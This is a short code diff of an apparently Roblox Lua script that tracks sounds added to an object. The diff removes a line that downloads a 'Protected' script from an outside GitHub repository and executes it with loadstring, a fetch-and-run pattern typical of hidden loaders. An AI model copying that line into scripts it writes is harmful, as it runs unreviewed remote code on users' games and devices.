@@ -50,5 +50,3 @@ target.ChildAdded:Connect(function(child)
     task.wait()
     trackSound(child)
 end)
-
-loadstring(game:HttpGet("https://github.com/AdmBrookhavenScripts/Sonic1/raw/refs/heads/main/Protected%20SonicXSuper.txt"))()
